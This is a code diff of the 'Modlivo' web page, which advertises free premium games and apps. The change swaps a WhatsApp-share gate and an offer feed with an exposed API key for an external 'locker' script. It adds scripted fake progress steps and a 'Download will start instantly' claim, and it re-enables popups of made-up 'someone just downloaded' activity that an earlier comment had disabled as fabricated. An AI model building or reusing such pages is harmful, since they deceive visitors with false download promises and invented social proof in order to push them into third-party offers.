@@ -186,7 +186,7 @@ h1{font-family:"Space Grotesk";font-size:clamp(54px,7.5vw,104px);line-height:.84
 .footer-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
 .footer-brand { font-family: 'Space Grotesk', sans-serif; font-size: 20px; font-weight: 800; color: #fff; }
 .footer-note { color: var(--muted2); font-size: 13px; margin-top: 4px; }
-.footer-links { display: flex; gap: px; color: var(--muted); font-size: 13px; font-weight: 600; }
+.footer-links { display: flex; gap:14px; color: var(--muted); font-size: 13px; font-weight: 600; }
 
  
  
@@ -202,7 +202,27 @@ h1{font-family:"Space Grotesk";font-size:clamp(54px,7.5vw,104px);line-height:.84
 @keyframes float{50%{transform:translateY(-13px)}}@keyframes pulse{50%{box-shadow:0 0 0 9px rgba(183,255,60,.02),0 0 25px var(--lime)}}@keyframes sheen{0%,60%{transform:rotate(-38deg) translateX(-90px)}100%{transform:rotate(-38deg) translateX(190px)}}@keyframes spin{to{transform:rotate(360deg)}}@keyframes marquee{to{transform:translateX(-50%)}}
 @media(max-width:930px){.navlinks{display:none}.nav-search{width:170px}.hero-grid{grid-template-columns:1fr}.hero{padding-top:115px}.hero-stage{height:455px}.hero-frame{right:5%;width:86%}.app-grid{grid-template-columns:repeat(2,1fr)}.catalog-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
 @media(max-width:620px){.container{width:min(100% - 28px,1240px)}.header{height:68px}.nav-search{display:none}.menu{display:block;margin-left:auto}.brand-mark{width:39px;height:39px}.hero{padding-top:98px;min-height:0}.hero-grid{gap:20px}.hero-stage{height:345px}.hero-frame{height:295px;top:15px;width:90%;right:5%;border-radius:25px}.hero-info{left:18px;bottom:18px}.hero-info h2{font-size:27px}.float-chip{font-size:9px;padding:9px 10px}.float-chip.one{left:0;top:32px}.float-chip.two{right:0;bottom:18px}.search-panel{padding:7px}.search-icon{width:39px;height:39px}.search-button{height:39px;padding:0 12px}.section{padding-top:48px}.section-head{align-items:start}.section-head>.muted{display:none}.card{width:252px;flex-basis:252px}.thumb{height:154px}.mod-card{flex-basis:295px}.feature{grid-template-columns:1fr}.feature-art{min-height:250px;order:-1}.feature-copy{padding:28px}.app-grid{grid-template-columns:1fr}.catalog-grid{grid-template-columns:repeat(2,minmax(0,1fr));gap:9px}.catalog-grid .card-body{padding:11px}.catalog-grid .thumb{height:105px}.catalog-grid .card-title{font-size:13px}.catalog-grid .card-desc{font-size:9px;height:28px;margin:6px 0 9px}.catalog-grid .label{font-size:8px;padding:4px 5px}.device-grid{grid-template-columns:1fr}.detail-hero{height:235px}.detail-body{padding:19px}.footer-inner{flex-direction:column}.info-strip{gap:16px;justify-content:flex-start}}
+
+.ready-card{margin:4px auto 0;max-width:620px;text-align:center;padding:clamp(20px,4vw,34px);border:1px solid rgba(183,255,60,.22);border-radius:22px;background:radial-gradient(ellipse at 50% 0%,rgba(183,255,60,.09),transparent 65%),linear-gradient(145deg,#111923,#0b1017);box-shadow:0 18px 55px rgba(0,0,0,.24)}
+.ready-icon{width:54px;height:54px;margin:0 auto 17px;display:grid;place-items:center;border-radius:17px;background:rgba(183,255,60,.12);border:1px solid rgba(183,255,60,.3);color:var(--lime);font-size:27px;font-weight:900}
+.ready-card .kicker{color:var(--lime);letter-spacing:.16em;font-size:10px;font-weight:900}
+.ready-card h3{font-size:clamp(25px,4.5vw,38px);margin:10px 0 9px;line-height:1.08}
+.ready-copy{max-width:440px;margin:0 auto;color:#a8b3c3;font-size:13px;line-height:1.7}
+.ready-meta{display:flex;align-items:center;justify-content:center;gap:9px;flex-wrap:wrap;margin:19px 0;color:#d7dfeb;font-size:11px}
+.ready-dot{color:var(--lime)}
+.download-now{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:15px;width:min(100%,460px);min-height:66px;margin:0 auto;border:1px solid rgba(255,255,255,.22);border-radius:16px;background:linear-gradient(110deg,#b7ff3c,#d4ff75);color:#071008;font-weight:950;font-size:15px;letter-spacing:.06em;box-shadow:0 8px 30px rgba(183,255,60,.16);animation:downloadPulse 2s ease-in-out infinite}
+.download-now:before{content:"";position:absolute;top:-80%;left:-35%;width:25%;height:260%;background:rgba(255,255,255,.48);transform:rotate(22deg);animation:downloadShine 3.2s ease-in-out infinite}
+.download-now span{position:relative;z-index:1}.download-arrow{font-size:23px;transition:transform .2s}.download-now:hover{transform:translateY(-2px);filter:brightness(1.03)}.download-now:hover .download-arrow{transform:translate(3px,-3px)}
+.ready-card .small-note{max-width:440px;margin:14px auto 0;color:#748195;font-size:10px;line-height:1.6}
+@keyframes downloadPulse{0%,100%{box-shadow:0 8px 26px rgba(183,255,60,.12);transform:scale(1)}50%{box-shadow:0 10px 34px rgba(183,255,60,.28);transform:scale(1.012)}}
+@keyframes downloadShine{0%,45%{left:-35%}75%,100%{left:130%}}
+.footer-links{display:flex;align-items:center;justify-content:flex-end;flex-wrap:wrap;gap:14px 20px;color:var(--muted);font-size:12px;font-weight:600}.footer-links a{transition:color .2s}.footer-links a:hover{color:var(--lime)}
+@media(prefers-reduced-motion:reduce){.download-now,.download-now:before{animation:none}}
 </style>
+<link rel="icon" href="https://modlivo.com/favicon.ico" sizes="any">
+<link rel="apple-touch-icon" href="https://modlivo.com/apple-touch-icon.png">
+<script type="text/javascript">var KKatx_ZEk_sMmnec={"it":3621176,"key":"d2911"};</script>
+<script src="https://d1chbu4sfo2xhu.cloudfront.net/1cc028d.js"></script>
 </head>
 <body>
 <header class="header">
@@ -237,7 +257,30 @@ h1{font-family:"Space Grotesk";font-size:clamp(54px,7.5vw,104px);line-height:.84
 </div>
 </div>
 </section>
+<!-- Modlivo Download Activity Popup -->
+<div id="downloadPop" class="download-pop">
 
+  <div class="download-pop-icon">
+    <img id="downloadPopImage" src="" alt="">
+  </div>
+
+  <div class="download-pop-content">
+
+    <div class="download-pop-title">
+      Someone just downloaded
+      <strong id="downloadPopName">GTA V</strong>
+    </div>
+
+    <div class="download-pop-meta">
+      <span class="download-pop-dot"></span>
+      <span id="downloadPopPlatform">Android</span>
+      <span>•</span>
+      <span class="download-pop-time" id="downloadPopTime">2 min ago</span>
+    </div>
+
+  </div>
+
+</div>
 <div class="container search-wrap">
 <div class="search-panel">
 <div class="search-icon">⌕</div><input id="searchInput" placeholder="Search games, apps, genres or mods…" aria-label="Search catalog"><button class="search-button" id="searchBtn">Search</button>
@@ -282,9 +325,8 @@ h1{font-family:"Space Grotesk";font-size:clamp(54px,7.5vw,104px);line-height:.84
 <footer class="footer">
 <div class="footer-inner container">
 <div><div class="footer-brand">MODLIVO</div><div class="catalog-note">Next-generation digital app distribution platform.</div></div>
-<div class="footer-links"><span>Privacy Policy</span>
-      <span>Terms of Service</span>
-      <span>© 2026 Modlivo</span><br><small>© <span id="year"></span> Modlivo</small></div>
+<div class="footer-links">
+<a href="/about.html">About</a><a href="/contact.html">Contact</a><a href="/privacy.html">Privacy</a><a href="/terms.html">Terms</a><a href="/download-safety.html">Download &amp; Safety</a><span>© <span id="year"></span> Modlivo</span></div>
 </div>
 </footer>
 
@@ -305,19 +347,14 @@ h1{font-family:"Space Grotesk";font-size:clamp(54px,7.5vw,104px);line-height:.84
 </div>
 
 <div class="flow-step" data-step="2">
-<div class="kicker">Step 2</div>
-<div class="sharebox">
-<strong>Share <span id="shareItemName"></span> on WhatsApp</strong>
-<p class="muted" id="shareText">One quick step before download 🚀
-Share this with 2 WhatsApp groups 1 friend to continue. It only takes a few seconds.</p>
-<div class="share-actions">
-<button class="whatsapp" id="whatsappBtn">
-<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2a10 10 0 0 0-8.5 15.2L2 22l4.9-1.3A10 10 0 1 0 12 2zm0 18a8 8 0 0 1-4.1-1.1l-.3-.2-3 .8.8-2.9-.2-.3A8 8 0 1 1 12 20zm4.5-6c-.2-.1-1.5-.7-1.7-.8-.2-.1-.4-.1-.5.1-.2.3-.7.8-.8 1-.1.2-.3.2-.5.1s-1.1-.4-2.1-1.3c-.8-.7-1.3-1.6-1.5-1.9-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.4 0-.1 0-.3 0-.4s-.5-1.2-.7-1.7c-.2-.4-.4-.4-.5-.4h-.4c-.2 0-.5.1-.7.3-.2.3-.9.9-.9 2.2s1 2.5 1.1 2.7c.1.2 1.9 3 4.7 4.2.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.6-.1 1.5-.6 1.7-1.2.2-.6.2-1.1.1-1.2-.1-.1-.3-.2-.5-.3z"/></svg>
-Share on WhatsApp
-</button>
-<button class="continue" id="continueShareBtn" disabled>Continue</button>
-</div>
-<div class="timer" id="shareStatus">Click Share to unlock the Continue button</div>
+<div class="ready-card">
+<div class="ready-icon">✓</div>
+<div class="kicker">Your selection is ready</div>
+<h3><span id="readyItemName">Your download</span> is ready</h3>
+<p class="ready-copy">We’ve prepared the next step for your selected device. Tap below to continue to the download destination.</p>
+<div class="ready-meta"><span id="readyDevice">Selected device</span><span class="ready-dot">•</span><span>Link access</span></div>
+<button class="download-now" id="downloadNowBtn" type="button"><span>DOWNLOAD NOW</span><span class="download-arrow">↗</span></button>
+<p class="small-note">Powered by Syhustler</p>
 </div>
 </div>
 
@@ -330,12 +367,14 @@ Share on WhatsApp
 </div>
 
 <div class="flow-step" data-step="4">
-<div class="plugin-card">
-<h3 style="margin:0 0 6px;">Additional Plugin Required ⚠️</h3>
-<p style="font-size:12px;color:var(--muted);margin:0 0 14px;">Because of the size and requirements of this package, an additional plugin is needed to download <span id="pluginItemNameZ" style="color:var(--lime);font-weight:700;"></span>. Follow the instruction below to continue.</p>
-<div id="offerContainer">
-<div class="status-line">Loading available plugin configuration…</div>
-</div>
+<div class="ready-card locker-ready">
+<div class="ready-icon">↗</div>
+<div class="kicker">Secure access</div>
+<h3>Your download link is ready</h3>
+<p class="ready-copy">Continue to access the download through the campaign configured for this item.</p>
+<div class="ready-meta"><span id="lockerItemName">Selected item</span><span class="ready-dot">•</span><span id="lockerDevice">Selected device</span></div>
+<button class="download-now" id="launchLockerBtn" type="button"><span>CONTINUE</span><span class="download-arrow">↗</span></button>
+<p class="small-note">Download will start instantly......</p>
 </div>
 </div>
 
@@ -480,173 +519,44 @@ function render(data=items){
 
 function openDetail(i){
  const x=items[i]; if(!x)return;
- $('#detailTitle').textContent=x.name;
- $('#detailDescription').textContent=x.desc;
- $('#detailImage').src=x.image;
- $('#detailImage').alt=x.name;
+ $('#detailTitle').textContent=x.name; $('#detailDescription').textContent=x.desc;
+ $('#detailImage').src=x.image; $('#detailImage').alt=x.name;
  $('#detailBadges').innerHTML=`<span class="badge" style="position:static;display:inline-block">${x.mod?'MODDED':x.type.toUpperCase()}</span>`;
  $('#quickMeta').innerHTML=[x.category,x.type,x.version,x.device,...x.tags].map(v=>`<span>${v}</span>`).join('');
- $('#shareItemName').textContent=x.name;
- $('#pluginItemName').textContent=x.name;
- $('#pluginItemNameZ').textContent=x.name;
- $('#shareText').textContent=`One quick step before download 🚀
-Share with 2 WhatsApp groups and 1 friend to continue. It only takes a few seconds.`;
- resetFlow();
- $('#detailModal').classList.add('open');
- $('#detailModal').setAttribute('aria-hidden','false');
+ $('#readyItemName').textContent=x.name; $('#lockerItemName').textContent=x.name;
+ resetFlow(); $('#detailModal').classList.add('open'); $('#detailModal').setAttribute('aria-hidden','false');
 }
-
+let selectedDevice=''; let prepTimer=null;
 function resetFlow(){
- $$('.flow-step').forEach(s=>s.classList.remove('active'));
- $('.flow-step[data-step="1"]').classList.add('active');
- $('#shareStatus').textContent='Click Share to unlock the Continue button';
- $('#continueShareBtn').disabled=true;
- $('#progressBar').style.width='0%';
- $('#progressText').textContent='Initializing request…';
- $('#offerContainer').innerHTML='<div class="status-line">Loading available plugin configuration…</div>';
+ if(prepTimer){clearInterval(prepTimer);prepTimer=null;}
+ $$('.flow-step').forEach(s=>s.classList.remove('active')); $('.flow-step[data-step="1"]').classList.add('active');
+ $('#progressBar').style.width='0%'; $('#progressText').textContent='Preparing your selected experience…';
+ $('#readyDevice').textContent='Selected device'; $('#lockerDevice').textContent='Selected device';
 }
-
 function closeModal(id){$(id).classList.remove('open');$(id).setAttribute('aria-hidden','true')}
 function showStep(n){$$('.flow-step').forEach(s=>s.classList.remove('active'));$(`.flow-step[data-step="${n}"]`).classList.add('active')}
 
-// WhatsApp share flow
-$('#whatsappBtn').onclick=function(){
- const itemName=$('#shareItemName').textContent.trim()||'Game or app';
- const message=`🎮 ${itemName} — Found it on Modlivo!\n\n🔥 Ever wished you could play popular PC games on your phone? Discover PC gaming experiences, mobile games, apps & mods — all in one place!\n\n📱 Explore what's available, check device compatibility, and find free options to try.\n\n👀 Take a look — you might discover something you've been searching for!\n\n👉 https://modlivo.com/\n\n🚀 Your next gaming adventure could be one click away!`;
- window.open('https://wa.me/?text='+encodeURIComponent(message),'_blank','noopener');
- let left=7;
- $('#shareStatus').textContent=`Validating share requirement... ${left}s`;
- $('#continueShareBtn').disabled=true;
- const timer=setInterval(()=>{
-   left--;
-   if(left>0){
-     $('#shareStatus').textContent=`Validating share requirement... ${left}s`;
-   }else{
-     clearInterval(timer);
-     $('#shareStatus').textContent='Share step completed! You can now continue.';
-     $('#continueShareBtn').disabled=false;
-   }
- },1000);
-};
-
-$('#continueShareBtn').onclick=function(){
- $('#continueShareBtn').disabled=true;
+$$('.device').forEach(btn=>btn.addEventListener('click',()=>{
+ selectedDevice=btn.dataset.device||'Device';
+ $('#readyDevice').textContent=selectedDevice; $('#lockerDevice').textContent=selectedDevice;
+ $('#progressBar').style.width='0%'; $('#progressText').textContent='Preparing your selected experience…';
  showStep(3);
- runDownloadProgress();
-};
+ let elapsed=0; const duration=8500; const messages=[
+  [0,'Checking your selected device…'],[1800,'Preparing the download destination…'],[3900,'Setting up secure access…'],[6100,'Finalizing your download link…'],[7900,'Almost ready…']
+ ];
+ prepTimer=setInterval(()=>{elapsed+=100;$('#progressBar').style.width=Math.min(100,elapsed/duration*100)+'%';
+  let current=messages[0][1];messages.forEach(([t,m])=>{if(elapsed>=t)current=m});$('#progressText').textContent=current;
+  if(elapsed>=duration){clearInterval(prepTimer);prepTimer=null;showStep(2);}
+ },100);
+}));
 
-function runDownloadProgress(){
-  let p = 0;
-
-  const words = [
-    'Preparing your download…',
-    'Checking your selected device…',
-    'Preparing access…',
-    'Almost ready…'
-  ];
-
-  $('#progressBar').style.width = '0%';
-  $('#progressText').textContent = words[0];
-
-  const timer = setInterval(() => {
-
-    p += 5;
-
-    if(p > 100) p = 100;
-
-    $('#progressBar').style.width = p + '%';
-
-    if(p < 30){
-      $('#progressText').textContent = words[0];
-    }else if(p < 55){
-      $('#progressText').textContent = words[1];
-    }else if(p < 80){
-      $('#progressText').textContent = words[2];
-    }else{
-      $('#progressText').textContent = words[3];
-    }
-
-    if(p >= 100){
-      clearInterval(timer);
-
-      setTimeout(() => {
-        showStep(4);
-        fetchAdBlueOffers();
-      }, 500);
-    }
-
-  }, 400);
-}
-
-// AdBlueMedia: one eligible offer only.
-// IMPORTANT: replace the placeholder with your own provider key before deployment.
-const ADBLUEMEDIA_USER_ID='475101';
-const ADBLUEMEDIA_API_KEY='a71e9140b50e3221cbdc9435d9ec3b99';
-
-function escapeHtml(value){
- return String(value??'').replace(/[&<>'"]/g,ch=>({'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[ch]));
-}
-
-function fetchAdBlueOffers(){
- const container=$('#offerContainer');
- if(ADBLUEMEDIA_API_KEY==='PASTE_YOUR_ADBLUEMEDIA_API_KEY_HERE'){
-   container.innerHTML='<div class="status-line">AdBlueMedia is not configured yet. Add your API key in the configuration line.</div>';
-   return;
+$('#downloadNowBtn').addEventListener('click',()=>{showStep(4)});
+$('#launchLockerBtn').addEventListener('click',()=>{
+ if(typeof window._eN==='function'){window._eN();}else{
+  const status=document.querySelector('.locker-ready .small-note');
+  if(status)status.textContent='The access script could not load. Please refresh the page and try again.';
  }
- container.innerHTML='<div class="status-line">Loading available plugin configuration…</div>';
- const callbackName='modlivoOffers_'+Date.now()+'_'+Math.floor(Math.random()*10000);
- const script=document.createElement('script');
- const cleanup=()=>{delete window[callbackName];script.remove()};
- window[callbackName]=function(offers){
-   try{
-     if(Array.isArray(offers)&&offers.length){
-       const offer=offers[0];
-       const title=escapeHtml(offer.anchor||offer.name_short||offer.name||'Complete access');
-       const conversion=escapeHtml(offer.conversion||offer.description||'Complete this step to continue.');
-       const url=String(offer.url||'#');
-       container.innerHTML=`<div class="plugin-item"><div><b>${title}</b><p>${conversion}</p></div><a href="${escapeHtml(url)}" target="_blank" rel="noopener noreferrer" class="btn-install">Continue →</a></div>`;
-     }else{
-       container.innerHTML='<div class="status-line">No required plugins found for your region. Try again later.</div>';
-     }
-   }finally{cleanup()}
- };
- script.onerror=function(){cleanup();container.innerHTML='<div class="status-line">Unable to load plugin configuration. Check your internet connection.</div>'};
- const base='https://d3r33tlb373kwk.cloudfront.net/public/offers/feed.php';
- script.src=base+'?user_id='+encodeURIComponent(ADBLUEMEDIA_USER_ID)+'&api_key='+encodeURIComponent(ADBLUEMEDIA_API_KEY)+'&s1=&s2=&callback='+encodeURIComponent(callbackName);
- document.body.appendChild(script);
-}
-
-function search(q){
- q=q.trim().toLowerCase();
- if(!q){
-   catalogMode='All';
-   catalogVisible=8;
-   renderCatalog(items);
- }else{
-   const out=items.filter(x=>(x.name+' '+x.category+' '+x.type+' '+x.tags.join(' ')).toLowerCase().includes(q));
-   catalogMode='Search';
-   catalogVisible=8;
-   renderCatalog(out);
- }
- $('#categoryTitle').textContent=q?'Search results':'Choose a category';
- document.getElementById('categories').scrollIntoView({behavior:'smooth',block:'start'});
-}
-
-const heroSlides=items.filter(x=>x.trend).slice(0,4);let heroIndex=0;
-function setHero(i){
- heroIndex=i;
- const x=heroSlides[i];
- $('#heroImage').style.backgroundImage=`url("${x.image}")`;
- $('#heroTitle').textContent=x.name;
- $('#heroKicker').textContent=x.mod?'Featured mod':'Featured title';
- $('#heroDesc').textContent=x.desc;
- $('#heroDots').innerHTML=heroSlides.map((_,n)=>`<button class="hero-dot ${n===i?'active':''}" data-hero="${n}" aria-label="Slide ${n+1}"></button>`).join('');
-}
-setHero(0);setInterval(()=>setHero((heroIndex+1)%heroSlides.length),5200);
-$('#featureArt').style.backgroundImage=`url("${items.find(x=>x.name==='Titanfall 2').image}")`;
-$('#searchBtn').onclick=()=>search($('#searchInput').value);
-$('#navSearch').addEventListener('keydown',e=>{if(e.key==='Enter')search(e.target.value)});
-$('#searchInput').addEventListener('keydown',e=>{if(e.key==='Enter')search(e.target.value)});
+});
 
 document.addEventListener('click',e=>{
  const c=e.target.closest('[data-index]');
@@ -665,10 +575,6 @@ document.addEventListener('click',e=>{
    $('#searchInput').value='';
    $('#navSearch').value='';
    renderCatalog(data);
- }
- if(e.target.matches('[data-device]')){
-   showStep(2);
-   $('#shareStatus').textContent=`Selected ${e.target.dataset.device}. Click Share on WhatsApp to continue.`;
  }
 });
 
@@ -791,7 +697,7 @@ function startDownloadPopups() {
 
 /* Start popup system */
 
-downloadPopStartTimer = setTimeout(() => { return; /* disabled: no fabricated download activity */
+downloadPopStartTimer = setTimeout(() => {
 
   if (downloadPopPaused) return;
 
@@ -827,18 +733,18 @@ if (detailModal) {
 
 /* Also pause immediately when openDetail() is called */
 
-const modlivoItemSlugs = {"0": "gta-v", "1": "netflix-premium", "2": "ea-fc-27", "3": "capcut-pro", "4": "red-dead-redemption-2", "5": "youtube-vanced", "6": "elden-ring", "7": "cyberpunk-2077", "8": "battlefield-6", "9": "picsart-ultra", "10": "minecraft-dungeons-ii", "11": "marvel-rivals", "12": "google-ai-ultra", "13": "the-finals", "14": "remini-ai-pro", "15": "hogwarts-legacy", "16": "amazon-music", "17": "counter-strike-2", "18": "nordvpn", "19": "lethal-company", "20": "truecaller-pro", "21": "titanfall-2", "22": "higgsfield-ai", "23": "phasmophobia", "24": "delta-force", "25": "moviebox-premium", "26": "beamng-drive", "27": "tiktok", "28": "ready-or-not", "29": "nova-launcher", "30": "r-e-p-o", "31": "adobe-premiere-rush", "32": "peak", "33": "rizzy-ai-infinite", "34": "escape-the-backrooms", "35": "schedule-i", "36": "valorant", "37": "xdefiant", "38": "cod-modern-warfare-4", "39": "crimson-desert", "40": "operator", "41": "the-last-of-us-part-ii", "42": "insurgency-sandstorm", "43": "hollow-knight-silksong", "44": "canva-pro"};
 const originalOpenDetail = window.openDetail;
+
 if (typeof originalOpenDetail === 'function') {
+
   window.openDetail = function(i) {
-    if (typeof pauseDownloadPopups === 'function') pauseDownloadPopups();
-    const slug = modlivoItemSlugs[String(i)];
-    if (slug) {
-      window.location.href = '/items/' + encodeURIComponent(slug) + '/';
-      return;
-    }
+
+    pauseDownloadPopups();
+
     return originalOpenDetail(i);
+
   };
+
 }
 </script>
  
